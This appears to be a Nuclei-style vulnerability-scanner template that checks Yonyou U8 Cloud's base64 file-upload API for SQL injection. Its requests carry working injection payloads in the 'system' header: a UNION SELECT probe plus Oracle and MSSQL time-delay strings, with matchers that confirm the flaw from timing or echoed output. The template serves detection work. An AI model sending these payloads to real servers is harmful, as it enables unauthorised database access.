id: yonyou-u8cloud-base64-sqli

info:
  name: yonyou-u8cloud-base64-sqli
  author: msk
  severity: critical

http:
  - raw:

      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close
    
      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1' AND 6454=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(84)||CHR(65)||CHR(112),0)-- sfce
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close

      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1' AND 6454=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(84)||CHR(65)||CHR(112),2)-- sfce
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close


      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1' AND 6454=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(84)||CHR(65)||CHR(112),4)-- sfce
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close



      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1';WAITFOR DELAY '0:0:0'--'
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close

      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1';WAITFOR DELAY '0:0:2'--'
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close

      - |
        POST /u8cloud/api/file/upload/base64 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        system: 1';WAITFOR DELAY '0:0:4'--'
        trantype: pk
        isEncrypt: N
        sign: token
        Connection: close  



    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        condition: and
        dsl:
          - duration_2>=0  && duration_2<=2
          - duration_3>=2  && duration_3<=4
          - duration_4>=4  && duration_4<=6
          - status_code_2==200 && status_code_3==200 && status_code_4==200
          - contains_all(body_2,'status','errorcode') && contains_all(body_3,'status','errorcode') && contains_all(body_4,'status','errorcode')


      - type: dsl
        condition: and
        dsl:
          - duration_5>=0  && duration_5<=2
          - duration_6>=2  && duration_6<=4
          - duration_7>=4  && duration_7<=6
          - status_code_5==200 && status_code_6==200 && status_code_7==200
          - contains_all(body_5,'status','errorcode') && contains_all(body_6,'status','errorcode') && contains_all(body_7,'status','errorcode')



      - type: dsl
        dsl:
          - contains_all(body_1,'12321','errorcode')
